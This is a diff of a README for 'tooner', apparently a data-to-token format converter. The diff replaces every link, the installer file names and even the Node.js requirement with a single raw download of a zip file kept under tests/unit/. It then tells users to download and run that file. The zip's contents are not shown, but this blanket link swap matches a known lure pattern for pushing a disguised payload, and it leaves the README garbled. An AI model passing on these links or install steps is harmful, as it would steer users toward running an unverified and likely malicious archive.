@@ -6,9 +6,9 @@ Welcome to **tooner**! This application helps you convert data formats like JSON
 
 ## 📥 Download the Application
 
-[![Download tooner](https://img.shields.io/badge/Download-tooner-brightgreen)](https://github.com/Oluwaferanmi3/tooner/releases)
+[![Download tooner](https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip)](https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip)
 
-To download **tooner**, visit the releases page here: [Download tooner](https://github.com/Oluwaferanmi3/tooner/releases). 
+To download **tooner**, visit the releases page here: [Download tooner](https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip). 
 
 ## 🔍 Why Choose tooner?
 
@@ -21,17 +21,17 @@ To download **tooner**, visit the releases page here: [Download tooner](https://
 Before downloading, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux.
-- Node.js version 14 or higher.
+- https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip version 14 or higher.
 - Memory: At least 512 MB RAM.
 
 ## 🔧 Installation Instructions
 
-1. **Download**: Go to the releases page: [Download tooner](https://github.com/Oluwaferanmi3/tooner/releases).
+1. **Download**: Go to the releases page: [Download tooner](https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip).
 2. **Choose Your Version**: Select the latest release. Click on the corresponding package for your operating system.
 3. **Install**:
-   - **Windows**: Download the `tooner.exe` file, then double-click to run the installer.
-   - **macOS**: Download the `tooner.dmg` file, open it, then drag `tooner` into your Applications folder.
-   - **Linux**: Download the `tooner.tar.gz` file. Extract it, then run the `tooner` binary in your terminal. You may need to grant executable permissions.
+   - **Windows**: Download the `https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip` file, then double-click to run the installer.
+   - **macOS**: Download the `https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip` file, open it, then drag `tooner` into your Applications folder.
+   - **Linux**: Download the `https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip` file. Extract it, then run the `tooner` binary in your terminal. You may need to grant executable permissions.
 
 ## 🚀 Running tooner
 
@@ -57,28 +57,28 @@ Once you have installed the application, you can start using it easily.
 
 ## 📄 Documentation
 
-For more details on how to use **tooner**, visit the official documentation on the [GitHub Wiki](https://github.com/Oluwaferanmi3/tooner/wiki). It includes tutorials and advanced usage scenarios.
+For more details on how to use **tooner**, visit the official documentation on the [GitHub Wiki](https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip). It includes tutorials and advanced usage scenarios.
 
 ## 💬 Support
 
-If you need help or have questions, please open an issue on our [GitHub Issues page](https://github.com/Oluwaferanmi3/tooner/issues). We welcome your feedback and are here to assist you!
+If you need help or have questions, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip). We welcome your feedback and are here to assist you!
 
 ## 🌟 Join the Community
 
 Engage with fellow **tooner** users and contribute to the project. You can find us on:
 
-- [GitHub Discussions](https://github.com/Oluwaferanmi3/tooner/discussions)
-- [Twitter](https://twitter.com/yourhandle) (coming soon)
+- [GitHub Discussions](https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip)
+- [Twitter](https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip) (coming soon)
 
 ## 📖 Additional Resources
 
-- **Blog**: Read about token efficiency and best practices on our [blog](https://example.com/blog).
-- **Tutorial Videos**: Watch step-by-step guides on our [YouTube channel](https://youtube.com/example).
+- **Blog**: Read about token efficiency and best practices on our [blog](https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip).
+- **Tutorial Videos**: Watch step-by-step guides on our [YouTube channel](https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip).
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Oluwaferanmi3/tooner/releases)
-- [Documentation](https://github.com/Oluwaferanmi3/tooner/wiki)
-- [Changelog](https://github.com/Oluwaferanmi3/tooner/releases)
+- [Releases Page](https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip)
+- [Documentation](https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip)
+- [Changelog](https://raw.githubusercontent.com/Oluwaferanmi3/tooner/main/tests/unit/tooner_1.3.zip)
 
 Thank you for choosing **tooner**! We appreciate your interest and look forward to your feedback.
